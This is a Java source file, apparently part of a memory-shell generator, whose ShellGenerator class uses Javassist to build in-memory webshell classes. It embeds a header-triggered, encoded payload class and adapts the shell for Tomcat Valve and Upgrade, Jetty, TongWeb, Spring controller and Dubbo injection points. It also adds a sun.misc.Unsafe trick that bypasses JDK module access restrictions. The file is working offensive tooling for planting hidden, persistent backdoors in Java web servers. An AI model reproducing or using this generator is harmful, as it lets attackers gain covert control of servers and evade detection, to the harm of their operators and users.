package org.leo.jmg.mem.shell;

import javassist.ClassClassPath;
import javassist.ClassMap;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import javassist.CtNewMethod;
import javassist.Modifier;
import org.leo.core.infrastructure.bytecode.asm.ClassFileMinimizer;
import org.leo.jmg.ServletNamespace;
import org.leo.jmg.catalog.InjectorDescriptor;
import org.leo.jmg.generation.GenerationRequest;
import org.leo.jmg.generation.GenerationWorkspace;
import org.leo.jmg.util.base64.Base64Utils;
import org.leo.jmg.util.javassist.JavassistUtil;
import org.leo.jmg.util.response.ResponseUtil;

import java.io.InputStream;

public class ShellGenerator {

    public byte[] makeShell(GenerationRequest request,
                            GenerationWorkspace workspace,
                            InjectorDescriptor descriptor) throws Exception {
        return makeShell(new ShellTemplateContext(
                workspace.getShellClassName(),
                request.getHeaderName(),
                request.getHeaderValue(),
                request.getCoreClassName(),
                workspace.getCoreClassBytes(),
                request.getResponseCode(),
                descriptor.getInjectorName(),
                request.getServerType(),
                request.getServerVersion(),
                request.getEffectiveServletNamespace(),
                request.isBypassJavaModuleEffective(),
                request.isShrink()),
                descriptor.getShellTemplateName());
    }

    private byte[] makeShell(ShellTemplateContext context,
                             String shellTplName) throws Exception {
        // 每次操作创建完全独立的池（parent=null），避免模板类被 getDefault() 父池缓存后
        // makeClass() 抛出 "is in a parent ClassPool" 错误
        ClassPool pool = new ClassPool(null);
        pool.appendSystemPath();

        // 从模板类字节码克隆出一个新的 CtClass，避免直接修改模板本身
        String resourcePath = shellTplName.replace('.', '/') + ".class";

        // 直接读取已编译模板类的字节码，避免依赖 Class.forName，也避免维护一份容易过期的资源副本。
        try (InputStream is = Thread.currentThread().getContextClassLoader().getResourceAsStream(resourcePath)) {
            if (is == null) {
                throw new RuntimeException("Cannot find shell template class bytes from resource: " + resourcePath
                        + " (shellTplName=" + shellTplName + ")");
            }

            // 保证能够解析依赖类（以当前模块 classpath 为准）
            pool.insertClassPath(new ClassClassPath(ShellGenerator.class));
            CtClass ctClass = pool.makeClass(is);
            try {
                // 改名为用户指定的 Shell 类名
                ctClass.setName(context.shellClassName);
                // 统一降到 Java 5，减小兼容性问题
                ctClass.getClassFile().setVersionToJava5();

                // 用实际配置替换模板中的静态字段
                JavassistUtil.replaceStaticField(ctClass, "headerName",
                        "private static String headerName = \"" + JavassistUtil.escapeJavaString(context.headerName) + "\";");
                JavassistUtil.replaceStaticField(ctClass, "headerValue",
                        "private static String headerValue = \"" + JavassistUtil.escapeJavaString(context.headerValue) + "\";");
                JavassistUtil.replaceStaticField(ctClass, "coreClassName",
                        "private static String coreClassName = \"" + JavassistUtil.escapeJavaString(context.coreClassName) + "\";");
                // coreClass 直接写入字符串，调用方需要保证其内容已经做好压缩/编码
                JavassistUtil.replaceStaticField(ctClass, "coreClass",
                        "private static String coreClass = \"" + JavassistUtil.escapeJavaString(Base64Utils.gzipAndBase64(context.coreClassBytes)) + "\";");
                JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "respCode",
                        "private static int respCode = " + context.responseCode + ";");

                if ("ListenerInjector".equals(context.injectorName)) {
                    String methodBody = ResponseUtil.getMethodBody(context.serverType);
                    JavassistUtil.addMethod(ctClass, "getResponseFromRequest", methodBody);
                }
                if ("CustomizerInjector".equals(context.injectorName)) {
                    addJettyCustomizerContract(pool, ctClass);
                }
                if ("Jetty".equalsIgnoreCase(context.serverType)
                        && "HandlerInjector".equals(context.injectorName)) {
                    addJettyHandlerContract(pool, ctClass, context.serverVersion,
                            context.servletNamespace);
                }
                if ("Tomcat".equalsIgnoreCase(context.serverType)
                        && "UpgradeInjector".equals(context.injectorName)) {
                    addTomcatUpgradeContract(pool, ctClass);
                }
                if ("ControllerHandlerInjector".equals(context.injectorName)) {
                    addSpringControllerContract(pool, ctClass, context.servletNamespace);
                }
                if (context.injectorName.endsWith("DubboServiceInjector")) {
                    addDubboServiceContract(pool, ctClass, context.shellClassName);
                }

                if (context.bypassJavaModule) {
                    injectJavaModuleBypass(ctClass);
                }

                JavassistUtil.applyServletNamespace(ctClass, context.servletNamespace);
                applyContainerContract(ctClass, context);

                // 输出并做一次瘦身
                byte[] bytes = ctClass.toBytecode();
                return context.shrink
                        ? ClassFileMinimizer.transform(bytes)
                        : bytes;
            } finally {
                ctClass.detach();
            }
        }
    }

    /** 让 Shell 自身成为反射调用方时同样具备 JDK 9+ 模块访问能力。 */
    private void injectJavaModuleBypass(CtClass ctClass) throws Exception {
        final String methodName = "bypassJavaModule";
        ctClass.addMethod(CtNewMethod.make(
                "private static void " + methodName + "(Class target){"
                        + "try{"
                        + "Class uc=Class.forName(\"sun.misc.Unsafe\");"
                        + "java.lang.reflect.Field uf=uc.getDeclaredField(\"theUnsafe\");"
                        + "uf.setAccessible(true);"
                        + "Object u=uf.get(null);"
                        + "Object m=Class.class.getMethod(\"getModule\",new Class[0])"
                        + ".invoke(Object.class,new Object[0]);"
                        + "java.lang.reflect.Method of=u.getClass().getMethod("
                        + "\"objectFieldOffset\",new Class[]{java.lang.reflect.Field.class});"
                        + "Long o=(Long)of.invoke(u,new Object[]{Class.class.getDeclaredField(\"module\")});"
                        + "java.lang.reflect.Method gs=u.getClass().getMethod("
                        + "\"getAndSetObject\",new Class[]{Object.class,Long.TYPE,Object.class});"
                        + "gs.invoke(u,new Object[]{target,o,m});"
                        + "}catch(Throwable ignored){}"
                        + "}", ctClass));
        String call = methodName + "(" + ctClass.getName() + ".class);";
        CtConstructor initializer = ctClass.getClassInitializer();
        if (initializer == null) initializer = ctClass.makeClassInitializer();
        initializer.insertBefore(call);
    }

    /**
     * TongWeb 6/7/8 对 Catalina API 做了不同包名的重定位。Valve Shell 必须与
     * 注入器运行时加载的 Valve、Request、Response 类型保持同一套描述符。
     */
    private void applyContainerContract(CtClass ctClass,
                                        ShellTemplateContext context) {
        if (!"TongWeb".equalsIgnoreCase(context.serverType)
                || !"ValveInjector".equals(context.injectorName)) {
            return;
        }
        String targetPackage;
        if ("6".equals(context.serverVersion)) {
            targetPackage = "com.tongweb.web.thor";
        } else if ("7".equals(context.serverVersion)) {
            targetPackage = "com.tongweb.catalina";
        } else if ("8".equals(context.serverVersion)) {
            targetPackage = "com.tongweb.server";
        } else {
            throw new IllegalArgumentException(
                    "TongWeb Valve 的 serverVersion 必须是 6、7 或 8");
        }

        ClassMap classMap = new ClassMap();
        classMap.put("org.apache.catalina.Valve", targetPackage + ".Valve");
        classMap.put("org.apache.catalina.connector.Request",
                targetPackage + ".connector.Request");
        classMap.put("org.apache.catalina.connector.Response",
                targetPackage + ".connector.Response");
        ctClass.replaceClassName(classMap);
    }

    /** 补入 Jetty 9+ HttpConfiguration.Customizer 的真实接口和方法描述符。 */
    private void addJettyCustomizerContract(ClassPool pool, CtClass ctClass) throws Exception {
        CtClass customizer = pool.makeInterface(
                "org.eclipse.jetty.server.HttpConfiguration$Customizer");
        ctClass.setInterfaces(new CtClass[]{customizer});

        CtClass connector = pool.makeInterface("org.eclipse.jetty.server.Connector");
        CtClass configuration = pool.makeClass("org.eclipse.jetty.server.HttpConfiguration");
        CtClass request = pool.makeClass("org.eclipse.jetty.server.Request");
        CtMethod bridge = new CtMethod(CtClass.voidType, "customize",
                new CtClass[]{connector, configuration, request}, ctClass);
        bridge.setModifiers(Modifier.PUBLIC);
        bridge.setBody("{ customizeRequest($3); }");
        ctClass.addMethod(bridge);
    }

    /** 补入 Jetty 7-11 AbstractHandler 父类及对应 Servlet Handler 方法。 */
    private void addJettyHandlerContract(ClassPool pool,
                                         CtClass ctClass,
                                         String serverVersion,
                                         ServletNamespace servletNamespace) throws Exception {
        if (!"7-10".equals(serverVersion) && !"11".equals(serverVersion)) {
            throw new IllegalArgumentException(
                    "Jetty Handler 的 serverVersion 必须是 7-10 或 11");
        }
        if ("11".equals(serverVersion)
                && servletNamespace.resolve() != ServletNamespace.JAKARTA) {
            throw new IllegalArgumentException(
                    "Jetty 11 Handler 需要 jakarta servletNamespace");
        }
        CtClass abstractHandler = pool.makeClass(
                "org.eclipse.jetty.server.handler.AbstractHandler");
        CtConstructor abstractHandlerConstructor =
                new CtConstructor(new CtClass[0], abstractHandler);
        abstractHandlerConstructor.setBody("{}");
        abstractHandler.addConstructor(abstractHandlerConstructor);
        ctClass.setSuperclass(abstractHandler);
        for (CtConstructor constructor : ctClass.getDeclaredConstructors()) {
            constructor.setBody("{ super(); }");
        }

        CtClass request = pool.makeClass("org.eclipse.jetty.server.Request");
        CtClass servletRequest = pool.get("javax.servlet.http.HttpServletRequest");
        CtClass servletResponse = pool.get("javax.servlet.http.HttpServletResponse");
        CtMethod handle = new CtMethod(CtClass.voidType, "handle",
                new CtClass[]{pool.get("java.lang.String"), request,
                        servletRequest, servletResponse}, ctClass);
        handle.setModifiers(Modifier.PUBLIC);
        handle.setExceptionTypes(new CtClass[]{
                pool.get("java.io.IOException"),
                pool.get("javax.servlet.ServletException")});
        handle.setBody("{ if (handleRequest($3, $4)) { markHandled($2); return; } forward($args); }");
        ctClass.addMethod(handle);
    }


    /**
     * 补入 Tomcat 8.5-11 UpgradeProtocol 契约。8.5 与 9+ 的
     * getInternalUpgradeHandler 参数不同，因此同时生成两个重载。
     */
    private void addTomcatUpgradeContract(ClassPool pool,
                                          CtClass ctClass) throws Exception {
        CtClass upgradeProtocol = pool.makeInterface("org.apache.coyote.UpgradeProtocol");
        ctClass.setInterfaces(new CtClass[]{upgradeProtocol});

        ctClass.addMethod(CtNewMethod.make(
                "public boolean acceptUpgradeRequest(Object value){"
                        + "try{"
                        + "java.lang.reflect.Method note=value.getClass().getMethod("
                        + "\"getNote\",new Class[]{Integer.TYPE});"
                        + "Object request=note.invoke(value,new Object[]{Integer.valueOf(1)});"
                        + "if(request==null)return false;"
                        + "java.lang.reflect.Method getter=request.getClass().getMethod("
                        + "\"getResponse\",new Class[0]);"
                        + "Object currentResponse=getter.invoke(request,new Object[0]);"
                        + "equals(new Object[]{request,currentResponse});"
                        + "return false;"
                        + "}catch(Throwable ignored){return false;}"
                        + "}", ctClass));

        CtClass request = pool.makeClass("org.apache.coyote.Request");
        CtClass adapter = pool.makeInterface("org.apache.coyote.Adapter");
        CtClass processor = pool.makeInterface("org.apache.coyote.Processor");
        CtClass socketWrapper = pool.makeClass(
                "org.apache.tomcat.util.net.SocketWrapperBase");
        CtClass internalHandler = pool.makeInterface(
                "org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler");

        addMethod(ctClass, CtClass.booleanType, "accept",
                new CtClass[]{request}, "{ return acceptUpgradeRequest($1); }");
        addMethod(ctClass, pool.get("java.lang.String"), "getHttpUpgradeName",
                new CtClass[]{CtClass.booleanType}, "{ return getClass().getName(); }");
        addMethod(ctClass, pool.get("byte[]"), "getAlpnIdentifier",
                new CtClass[0], "{ return new byte[0]; }");
        addMethod(ctClass, pool.get("java.lang.String"), "getAlpnName",
                new CtClass[0], "{ return \"\"; }");
        addMethod(ctClass, processor, "getProcessor",
                new CtClass[]{socketWrapper, adapter}, "{ return null; }");
        addMethod(ctClass, internalHandler, "getInternalUpgradeHandler",
                new CtClass[]{adapter, request}, "{ return null; }");
        addMethod(ctClass, internalHandler, "getInternalUpgradeHandler",
                new CtClass[]{socketWrapper, adapter, request}, "{ return null; }");
    }

    private void addMethod(CtClass owner,
                           CtClass returnType,
                           String name,
                           CtClass[] parameterTypes,
                           String body) throws Exception {
        CtMethod method = new CtMethod(returnType, name, parameterTypes, owner);
        method.setModifiers(Modifier.PUBLIC);
        method.setBody(body);
        owner.addMethod(method);
    }

    /** 按 Spring 5/6 的 Servlet 命名空间补入 MVC Controller 契约。 */
    private void addSpringControllerContract(ClassPool pool,
                                             CtClass ctClass,
                                             ServletNamespace namespace) throws Exception {
        CtClass controller = pool.get("org.springframework.web.servlet.mvc.Controller");
        ctClass.setInterfaces(new CtClass[]{controller});

        String servletPrefix = namespace.resolve() == ServletNamespace.JAKARTA
                ? "jakarta.servlet.http." : "javax.servlet.http.";
        CtClass request = pool.get(servletPrefix + "HttpServletRequest");
        CtClass response = pool.get(servletPrefix + "HttpServletResponse");
        CtClass modelAndView = pool.get("org.springframework.web.servlet.ModelAndView");
        CtMethod bridge = new CtMethod(modelAndView, "handleRequest",
                new CtClass[]{request, response}, ctClass);
        bridge.setModifiers(Modifier.PUBLIC);
        bridge.setExceptionTypes(new CtClass[]{pool.get("java.lang.Exception")});
        bridge.setBody("{ return ($r) handleRequestObjects($1, $2); }");
        ctClass.addMethod(bridge);
    }

    /** Dubbo 动态服务要求实现类与运行时生成的同包接口保持一致。 */
    private void addDubboServiceContract(ClassPool pool,
                                         CtClass ctClass,
                                         String shellClassName) throws Exception {
        int packageEnd = shellClassName.lastIndexOf('.');
        String packageName = packageEnd < 0 ? "" : shellClassName.substring(0, packageEnd + 1);
        String simpleName = packageEnd < 0 ? shellClassName : shellClassName.substring(packageEnd + 1);
        CtClass service = pool.makeInterface(packageName + "I" + simpleName);
        service.addMethod(CtNewMethod.abstractMethod(
                pool.get("byte[]"), "handle", new CtClass[]{pool.get("byte[]")},
                new CtClass[0], service));
        ctClass.setInterfaces(new CtClass[]{service});
    }

    /**
     * 将普通字符串转义为可安全写入 Java 字面量的形式
     */
    private static final class ShellTemplateContext {
        private final String shellClassName;
        private final String headerName;
        private final String headerValue;
        private final String coreClassName;
        private final byte[] coreClassBytes;
        private final int responseCode;
        private final String injectorName;
        private final String serverType;
        private final String serverVersion;
        private final ServletNamespace servletNamespace;
        private final boolean bypassJavaModule;
        private final boolean shrink;

        private ShellTemplateContext(String shellClassName,
                                     String headerName,
                                     String headerValue,
                                     String coreClassName,
                                     byte[] coreClassBytes,
                                     int responseCode,
                                     String injectorName,
                                     String serverType,
                                     String serverVersion,
                                     ServletNamespace servletNamespace,
                                     boolean bypassJavaModule,
                                     boolean shrink) {
            this.shellClassName = shellClassName;
            this.headerName = headerName;
            this.headerValue = headerValue;
            this.coreClassName = coreClassName;
            this.coreClassBytes = coreClassBytes;
            this.responseCode = responseCode;
            this.injectorName = injectorName;
            this.serverType = serverType;
            this.serverVersion = serverVersion;
            this.servletNamespace = servletNamespace;
            this.bypassJavaModule = bypassJavaModule;
            this.shrink = shrink;
        }
    }
}
